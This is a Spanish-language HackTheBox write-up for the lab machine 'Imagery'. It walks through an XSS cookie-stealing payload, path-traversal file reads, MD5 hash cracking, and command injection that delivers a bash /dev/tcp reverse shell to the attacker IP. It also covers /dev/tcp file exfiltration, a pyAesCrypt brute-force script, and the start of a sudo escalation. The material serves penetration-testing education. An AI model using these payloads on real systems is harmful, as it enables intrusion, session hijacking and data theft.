---
title: Imagery - Medium (HTB)
permalink: /Imagery-HTB-Writeup/
tags:
  - Linux
  - Medium
  - AES Decrypt
  - XSS
  - Local File Inclusion
  - Fuzzing
  - Hash Cracking
  - Command Injection
  - pyAesCrypt
  - Python Scripting
  - Sudoers
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Imagery - Medium (HTB)
seo_description: Explota XSS, Local File Inclusion y privilegios sudo para vencer Imagery.
excerpt: Explota XSS, Local File Inclusion y privilegios sudo para vencer Imagery.
header:
  overlay_image: /assets/images/headers/imagery-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/imagery-hackthebox.jpg
---
![image-center](/assets/images/posts/imagery-hackthebox.png)
{: .align-center}

**Habilidades:** Blind Cross-Site Scripting (XSS), Local File Inclusion + Fuzzing, Hash Cracking, OS Command Injection, Basic System Enumeration, AES Decrypt + Brute Force - Python Scripting, Abusing Sudoers Privileges - Custom Binary [Pivilege Escalation]
{: .notice--primary}

# Introducción

Imagery es una máquina Linux de dificultad `Medium` en HackTheBox. En este escenario debemos vulnerar un sitio web combinando la explotación de una serie de vulnerabilidades web (XSS y LFI) hasta lograr RCE a través de una funcionalidad insegura de la web, y por ende, acceso inicial.

Una vez dentro del servidor, descifraremos una copia de seguridad de la web principal a través de la librería `pyAesCrypt`, donde obtendremos credenciales para cambiar de usuario en el sistema.

Para la escalada de privilegios, abusaremos de privilegios `sudoers` configurados de forma insegura en una herramienta personalizada, la cual permite trabajar con tareas `cron`. Esta admite un parámetro que resulta en ejecución de comandos privilegiados, mediante el cual ganaremos acceso completo.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.88 

PING 10.10.11.88 (10.10.11.88) 56(84) bytes of data.
64 bytes from 10.10.11.88: icmp_seq=1 ttl=63 time=427 ms

--- 10.10.11.88 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 426.507/426.507/426.507/0.000 ms
~~~


## Port Scanning 

Comenzaremos realizando un escaneo el cual se encargará de identificar puertos abiertos en la máquina víctima. En este caso debemos generar menos ruido en la red para poder encontrar todos los puertos abiertos

~~~ bash
nmap -p- --open -sS --min-rate 2500 -n -Pn 10.10.11.88 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-29 22:14 EDT
Nmap scan report for 10.10.11.88
Host is up (0.19s latency).
Not shown: 51798 closed tcp ports (reset), 13735 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 47.12 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que intente identificar la versión y los servicios que ejecuta cada puerto que descubrimos

~~~ bash
nmap -p 22,8000 -sVC 10.10.11.88 -oN services
                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-29 22:16 EDT
Nmap scan report for 10.10.11.88
Host is up (0.20s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Tue, 30 Sep 2025 02:16:19 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Tue, 30 Sep 2025 02:16:12 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 146960
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Image Gallery</title>
|     <script src="static/tailwind.js"></script>
|     <link rel="stylesheet" href="static/fonts.css">
|     <script src="static/purify.min.js"></script>
|     <style>
|     body {
|     font-family: 'Inter', sans-serif;
|     margin: 0;
|     padding: 0;
|     box-sizing: border-box;
|     display: flex;
|     flex-direction: column;
|     min-height: 100vh;
|     position: fixed;
|     top: 0;
|     width: 100%;
|     z-index: 50;
|_    #app-con
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=9/29%Time=68DB3D6C%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1589,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3
SF:\x20Python/3\.12\.7\r\nDate:\x20Tue,\x2030\x20Sep\x202025\x2002:16:12\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x20146960\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x2
SF:0lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x2
SF:0\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width
SF:,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Image\x20Gallery</ti
SF:tle>\n\x20\x20\x20\x20<script\x20src=\"static/tailwind\.js\"></script>\
SF:n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"static/fonts\.cs
SF:s\">\n\x20\x20\x20\x20<script\x20src=\"static/purify\.min\.js\"></scrip
SF:t>\n\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20
SF:{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Int
SF:er',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ma
SF:rgin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x
SF:200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-sizing:\x20bo
SF:rder-box;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20
SF:flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\
SF:x20column;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20min-height:
SF:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20nav\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posit
SF:ion:\x20fixed;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x2
SF:00;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x2050;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20#app-con")%
SF:r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x2
SF:0Werkzeug/3\.1\.3\x20Python/3\.12\.7\r\nDate:\x20Tue,\x2030\x20Sep\x202
SF:025\x2002:16:19\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\
SF:r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20h
SF:tml>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x2
SF:0Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x2
SF:0the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20p
SF:lease\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.54 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Logramos ver solamente dos servicios, `ssh` y un servicio `http` corriendo en el puerto `8000`


## Web Enumeration

Vemos un servicio `http` ejecutándose en el puerto `8000`. Antes de visitar el sitio web opcionalmente podemos lanzar un escaneo que identifique las tecnologías web que el servidor pueda estar utilizando, aunque en el escaneo con `nmap` vimos algunas de ellas

``` bash
whatweb http://10.10.11.88:8000

http://10.10.11.88:8000 [200 OK] Country[RESERVED][ZZ], Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], IP[10.10.11.88], Python[3.12.7], Script, Title[Image Gallery], Werkzeug[3.1.3]
```

Si navegamos hasta `http://10.10.11.88:8000`, veremos la siguiente web, donde podremos tanto registrarnos como iniciar sesión desde la barra superior derecha

![image-center](/assets/images/posts/imagery-1-hackthebox.png)
{: .align-center}

Registraremos una cuenta e iniciaremos sesión en la web

![image-center](/assets/images/posts/imagery-2-hackthebox.png)
{: .align-center}

### Image Upload

Al iniciar sesión, veremos la opción de subir imágenes a través del botón `Upload`

![image-center](/assets/images/posts/imagery-3-hackthebox.png)
{: .align-center}

El servidor solamente aceptará archivos `.jpg`, `.png`, etc. Subiremos una imagen normal a la web

![image-center](/assets/images/posts/imagery-4-hackthebox.png)
{: .align-center}

Desde la galería de imágenes en el sitio principal, contaremos con un menú de opciones. Algunas de esas opciones están bloqueadas por alguna razón 

![image-center](/assets/images/posts/imagery-5-hackthebox.png)
{: .align-center}

### Report Bug

En el `footer` de la web, veremos un botón con el mensaje `Report Bug`

![image-center](/assets/images/posts/imagery-6-hackthebox.png)
{: .align-center}

Este formulario nos permite reportar un problema en la web y enviarlo para revisión

![image-center](/assets/images/posts/imagery-7-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Blind Cross-Site Scripting (XSS)

Luego de realizar pruebas de XSS con el formulario desde la opción `Report Bug` en el `footer` de la web, lograremos que el servidor nos envíe una petición HTTP

> Iniciaremos un servidor HTTP con `python` usando el comando `python3 -m http.server 80` antes de enviar el payload a la web
{: .notice--warning}

![image-center](/assets/images/posts/imagery-8-hackthebox.png)
{: .align-center}

Al cabo de unos momentos, notaremos que el servidor solicita `/test`

``` bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.88 - - [05/Jan/2026 16:15:39] code 404, message File not found
10.10.11.88 - - [05/Jan/2026 16:15:39] "GET /test HTTP/1.1" 404 -
```

### Cookie Stealing

El siguiente payload de `Cross-Site Scripting` debería enviarnos la cookie de sesión del usuario que revise la solicitud

~~~ html
<img src=x onerror="document.location='http://10.10.14.11/?cookie='+document.cookie">
~~~

Al cabo de unos momentos recibiremos una solicitud en nuestro servidor HTTP

~~~ bash
10.10.11.88 - - [29/Sep/2025 22:51:12] "GET / HTTP/1.1" 200 -
10.10.11.88 - - [05/Jan/2026 16:19:39] "GET /?cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVwOrA.VcDiL87OwQnGEtK6Ul7qcviFEgI HTTP/1.1" 200 -
10.10.11.88 - - [29/Sep/2025 22:51:13] code 404, message File not found
10.10.11.88 - - [29/Sep/2025 22:51:13] "GET /favicon.ico HTTP/1.1" 404 -
~~~

Cargaremos la `cookie` en el navegador, de forma nativa podemos hacer esto desde las herramientas de desarrollador > `Storage` > `Cookies`

![image-center](/assets/images/posts/imagery-9-hackthebox.png)
{: .align-center}

Ahora recargaremos la web y desbloquearemos la siguiente funcionalidad de administración desde el botón `Admin Panel`

![image-center](/assets/images/posts/imagery-10-hackthebox.png)
{: .align-center}

Al hacer clic en `Admin Panel`, podremos administrar a los usuarios además de ver los reportes de `bugs`.

![image-center](/assets/images/posts/imagery-11-hackthebox.png)
{: .align-center}

Podremos descargar los archivos de `log` de cada usuario desde el botón `Download Log`

![image-center](/assets/images/posts/imagery-12-hackthebox.png)
{: .align-center}


## Local File Inclusion

Al intentar descargar un archivo de `log` de algún usuario, podremos ver que la solicitud de realiza hacia el endpoint `get_system_log` usando el parámetro `log_identifier`, donde se pasa como valor el nombre del usuario
 
![image-center](/assets/images/posts/imagery-13-hackthebox.png)
{: .align-center}

Podemos intentar desplazar el directorio para incluir archivos de la máquina de la siguiente forma

~~~ http
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd
~~~

Para facilitar el trabajo, lo más recomendable es enviar las peticiones HTTP desde un proxy HTTP como `Burpsuite`. 

> De lo contrario, descargaremos el archivo cada vez que hagamos una solicitud
{: .notice--danger}

![image-center](/assets/images/posts/imagery-14-hackthebox.png)
{: .align-center}

### Fuzzing

Al consultar un archivo que no existe, obtendremos el error `500` HTTP. Esto puede servir como un filtro de condición para evaluar si un archivo existe o no

![image-center](/assets/images/posts/imagery-15-hackthebox.png)
{: .align-center}

Lanzaremos una herramienta de `fuzzing` con el propósito de enumerar archivos del servidor web. En este contexto, el servidor usa `python`, además de que debemos retroceder un directorio para volver a la raíz porque estamos en la ruta `/admin`

``` bash
ffuf -fc 500 -w /usr/local/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVwOrA.VcDiL87OwQnGEtK6Ul7qcviFEgI' -u 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../FUZZ.py'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.88:8000/admin/get_system_log?log_identifier=../FUZZ.py
 :: Wordlist         : FUZZ: /usr/local/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVwOrA.VcDiL87OwQnGEtK6Ul7qcviFEgI
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

app                     [Status: 200, Size: 1943, Words: 229, Lines: 49, Duration: 149ms]
config                  [Status: 200, Size: 1809, Words: 170, Lines: 52, Duration: 153ms]
utils                   [Status: 200, Size: 4023, Words: 811, Lines: 124, Duration: 157ms]
```

> Como es común en servidores web `python`, existen archivos como `app.py`, `config.py` y `utils.py`.
{: .notice--warning}

### Web's Database - `db.json`

Al mostrar el archivo `config.py`, veremos que se define un archivo donde se guardan los datos. Un archivo JSON llamado `db.json`

![image-center](/assets/images/posts/imagery-16-hackthebox.png)
{: .align-center}

Al solicitar este archivo, veremos los registros de cada usuario de la web

![image-center](/assets/images/posts/imagery-17-hackthebox.png)
{: .align-center}


## Hash Cracking

Solicitaremos este archivo realizando una solicitud HTTP al servidor más o menos de la siguiente manera

> En este caso aprovecharemos la herramienta `jq` para aplicar una serie de filtros y así obtener un formato de hash que identificará al usuario en caso de descifrar la contraseña.
{: .notice--warning}

~~~ bash
curl -s 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../db.json' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVwOrA.VcDiL87OwQnGEtK6Ul7qcviFEgI' | jq -r '.users[] | "\(.username | split("@")[0]):\(.password)"' | tee hashes.txt

admin:5d9c1d507a3f76af1e5c97a3ad1eaa31
testuser:2c65c8d7bfbca32a3ed42596192384f6
~~~

Nos quedará el archivo `hashes.txt`, donde la cadena parece estar cifrada en `MD5`.

Lanzaremos una herramienta de cracking para intentar descifrar estos hashes a través de un ataque basado en diccionario

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
iambatman        (testuser)
1g 0:00:00:01 DONE (2026-01-05 16:51) 0.7142g/s 10245Kp/s 10245Kc/s 10418KC/s !..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```


## Web Session as `testuser`

Descubrimos la contraseña del usuario `testuser`, iniciaremos sesión en la plataforma web con sus credenciales

![image-center](/assets/images/posts/imagery-18-hackthebox.png)
{: .align-center}

Al momento de editar una foto desde la galería de imágenes, veremos que tenemos acceso a las opciones que antes no teníamos disponibles

![image-center](/assets/images/posts/imagery-19-hackthebox.png)
{: .align-center}

Haremos pruebas manuales averiguando cómo el servidor procesa las opciones disponibles


## OS Command Injection

Haciendo unas pruebas con la funcionalidad `Transform Image` > `Crop`

![image-center](/assets/images/posts/imagery-20-hackthebox.png)
{: .align-center}

Obtendremos un error que nos dice que se usan los parámetros dentro de un comando

![image-center](/assets/images/posts/imagery-21-hackthebox.png)
{: .align-center}

### Proof of Concept

El error que obtenemos se debe a que después del comando `id` que intentamos inyectar, se concatena un `0`, posiblemente el valor `y` que sigue.

> Podemos iniciar un listener ICMP para intentar enviar un ping a nuestra IP y validar ejecución de comandos: `tcpdump -i tun0 icmp`
{: .notice--warning}

Enviaremos el comando encapsulado en `;command;` para que pueda interpretarse por separado, aunque obtengamos un error en `Burpsuite`

~~~ json
{
	"imageId":"51e2e466-fb6f-4e83-8971-4cb18964ea36",
	"transformType":"crop",
	"params":{
		"x":";id;",
		"y":123,
		"width":750,
		"height":467
	}
}
~~~

Desde nuestro listener recibiremos una traza ICMP. ¡Tenemos RCE!

``` bash
11:38:09.550808 IP imagery.htb > 10.10.14.11: ICMP echo request, id 59642, seq 1, length 64
11:38:09.550861 IP 10.10.14.11 > imagery.htb: ICMP echo reply, id 59642, seq 1, length 64
```

### Exploiting

Antes de enviar una reverse shell, iniciaremos un listener en nuestra máquina atacante por un puerto, en mi caso elegí el `443`

``` bash
nc -lvnp 443
```

Es posible usar la ruta especial `/dev/tcp` para abrir un socket TCP hacia nuestra IP, enviando una shell con el parámetro `-i`

~~~ json
{
	"imageId":"d09a1e06-6dbe-45b7-af3f-32a30972d066",
	"transformType":"crop",
	"params":{
		"x":";bash -c \"bash -i >& /dev/tcp/10.10.14.11/443 0>&1\";",
		"y":  123,
		"width":750,
		"height":467
	}
}
~~~


## Shell as `web`

En nuestro listener recibiremos una consola de `bash` como el usuario `web`

~~~ bash
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.88] 53990
bash: cannot set terminal process group (1332): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$ whoami
web
~~~

### TTY Treatment

Haremos un tratamiento de la TTY para poder obtener una consola interactiva, donde podamos utilizar `Ctrl+C` sin terminar el proceso de la shell, además de ajustar las proporciones de la terminal

~~~ bash
web@Imagery:~/web$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
web@Imagery:~/web$ ^Z
[1]  + 146805 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo;fg            
[1]  + 146805 continued  nc -lvnp 443
                                     reset xterm

web@Imagery:~/web$ export TERM=xterm
web@Imagery:~/web$ stty rows 44 columns 184
~~~


## System Enumeration

Una vez dentro de la máquina, enumeraremos el sistema buscando una vía potencial para escalar privilegios o pivotar a otro Web usuario

``` bash
web@Imagery:~/web$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

### Users

Al consultar el archivo `passwd`, veremos que solamente existen los usuarios  `web`, `mark` y `root`

``` bash
web@Imagery:~/web$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
web:x:1001:1001::/home/web:/bin/bash
mark:x:1002:1002::/home/mark:/bin/bash
```

### Web Backup File

Durante una enumeración manual de rutas, encontraremos `/var/backup`, distinta de `/var/backups`

``` bash
web@Imagery:~/web$ ls /var -la
total 60
drwxr-xr-x 14 root root   4096 Sep 22 18:56 .
drwxr-xr-x 20 root root   4096 Sep 22 19:10 ..
drwxr-xr-x  2 root root   4096 Sep 22 18:56 backup
drwxr-xr-x  3 root root   4096 Sep 23 16:27 backups
drwxr-xr-x 17 root root   4096 Sep 22 18:56 cache
drwxrwsrwt  2 root root   4096 Sep 22 18:56 crash
drwxr-xr-x 45 root root   4096 Sep 22 19:11 lib
drwxrwsr-x  2 root staff  4096 Sep 22 18:56 local
lrwxrwxrwx  1 root root      9 Oct  7  2024 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jan  6 10:08 log
drwxrwsr-x  2 root mail   4096 Sep 22 18:56 mail
drwxr-xr-x  2 root root   4096 Sep 22 18:56 opt
lrwxrwxrwx  1 root root      4 Oct  7  2024 run -> /run
drwxr-xr-x  8 root root   4096 Sep 22 18:56 snap
drwxr-xr-x  4 root root   4096 Sep 22 18:56 spool
drwxrwxrwt  9 root root   4096 Jan  6 13:01 tmp
-rw-r--r--  1 root root    208 Oct  7  2024 .updated
```

En el directorio `/var/backup` veremos el siguiente archivo, un archivo comprimido que además posee una extensión `.aes`

~~~ bash
web@Imagery:~/web$ ls -l /var/backup
total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
~~~

### File Transfer

Podemos transferir este archivo comprimido a nuestra máquina atacante con un socket TCP

``` bash
web@Imagery:~/web$ cat /var/backup/web_20250806_120723.zip.aes > /dev/tcp/10.10.14.11/443
```

Para verificar la integridad del archivo durante la transferencia, podemos computar su hash MD5 con la herramienta `md5sum`, ambos archivos deben retornar el mismo hash

``` bash
web@Imagery:~/web$ md5sum /var/backup/web_20250806_120723.zip.aes 
c1355c88e9a51158f1f044243d08d042  /var/backup/web_20250806_120723.zip.aes

user@attacker-machine$ md5sum web_20250806_120723.zip.aes
c1355c88e9a51158f1f044243d08d042  web_20250806_120723.zip.aes
```

### `pyAesCrypt`

El archivo comprimido está cifrado con la librería `pyAesCrypt`, en su versión `6.1.1`

~~~ bash
file web_20250806_120723.zip.aes 
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
~~~


## AES Decrypt - Brute Force

> `pyAesCrypt` es un módulo y script de cifrado de archivos de `Python3` que utiliza `AES256-CBC` para cifrar/descifrar archivos y flujos binarios.
{: .notice--info}

Según la documentación de la librería [`pyAesCrypt`](pypi.org/project/pyAesCrypt/), posee funciones para cifrar/descifrar archivos

``` python
import pyAesCrypt
password = "please-use-a-long-and-random-password"
# encrypt
pyAesCrypt.encryptFile("data.txt", "data.txt.aes", password)
# decrypt
pyAesCrypt.decryptFile("data.txt.aes", "dataout.txt", password)
```

### Python Scripting

Para proteger los paquetes del sistema, utilizaremos un entorno virtual

``` bash
python3 -m venv .venv
source .venv/bin/activate
pip install 'pyAesCrypt==6.1.1'
pip install pwntools # Opcional, aunque necesario para el siguiente script
```

Podemos usar la función `decryptFile()` para intentar hacer fuerza bruta con un diccionario como el `rockyou.txt` usando un bucle. 

Cada línea del diccionario será usado en un intento para descifrar el archivo

``` python
#!/usr/bin/env pyhton3
import pyAesCrypt
import sys
from pwn import log

def decrypt_attempt(encrypted, out_filename, password):
    try:
        pyAesCrypt.decryptFile(encrypted, out_filename, password)
        return True
    except:
        return False

def brute(encrypted, out_filename, wordlist):

    bar = log.progress("Trying")
    try:
        with open(wordlist, 'r') as w:
            for password in w:
                result = decrypt_attempt(encrypted, out_filename, password.strip())

                bar.status(password)
                if result:
                    log.success(f"Password found!: {password}")
                    return
    except:
        log.error("Error, exiting...")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: pyhton3 {sys.argv[0]} <aes_file> <wordlist>")
        sys.exit(1)

    aes_file = sys.argv[1]
    wordlist = sys.argv[2]

    out_filename = aes_file.rsplit('.aes', 1)[0]
    brute(aes_file, out_filename, wordlist)
```

### Brute Force

Al lanzar nuestra mini herramienta, descubriremos que la contraseña es `bestfriends`

``` bash
python3 aes_brute.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt

[>] Trying: bestfriends
[+] Password found!: bestfriends
```

Además de esto, en nuestro directorio de trabajo se creará un archivo `.zip` resultante del proceso de descifrado

``` bash
ls web*

web_20250806_120723.zip  web_20250806_120723.zip.aes
```

Al ser una copia de seguridad de la web, los archivos son los mismos. Existe el mismo archivo de base de datos `db.json`.

``` bash
ls web/db.json   
web/db.json

cat web/db.json | head                                                               
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
```

Haciendo una consulta del campo `username`, veremos que `mark` (el cual es válido en el sistema) está contemplado como un registro de esta base de datos

``` bash
cat web/db.json | jq -r '.users[].username' 
admin@imagery.htb
testuser@imagery.htb
mark@imagery.htb
web@imagery.htb
```


## Hash Cracking

Podemos aplicar un filtro rápido con `jq` para solamente obtener el hash del usuario `mark`

``` bash
cat web/db.json | jq -r '.users[] | select(.username == "mark@imagery.htb") | .password' | tee hash.txt
01c3d2e5bdaf6134cec0a367cf53e535
```

Intentaremos descifrar esta contraseña con herramientas como `john` o `hashcat`, usando el diccionario `rockyou.txt`

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
supersmash       (?)
1g 0:00:00:00 DONE (2026-01-06 14:26) 16.66g/s 4325Kp/s 4325Kc/s 4325KC/s swhsco05..stephanie17
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```


## Shell as `mark`

Si intentamos conectarnos por `ssh` a la máquina víctima usando esta contraseña, obtendremos un error de clave pública

``` bash
ssh mark@imagery.htb
mark@imagery.htb: Permission denied (publickey).
```

Es posible migrar al usuario `mark` usando estas credenciales con el comando `su` (`mark:supersmash`)

~~~ bash
web@Imagery:~/web$ su mark 
Password: 
mark@Imagery:/home/web/web$
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
mark@Imagery:/home/web/web$ cd
mark@Imagery:~$ cat user.txt 
f4c...
~~~
<br>


# Escalada de Privilegios
---
## Abusing Sudoers Privileges

Si listamos los privilegios a nivel de `sudoers` que tenemos configurados, veremos que podemos ejecutar un binario llamado `charcol`

~~~ bash
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
~~~

Buscando en internet sobre esta herramienta no encontraremos información, por lo que podemos decir que se trata de una herramienta personalizada que nos ayuda con la administración de copias de seguridad.

La opción `shell` nos otorga una consola en la cual podemos ejecutar comandos

~~~ bash
mark@Imagery:~$ sudo charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

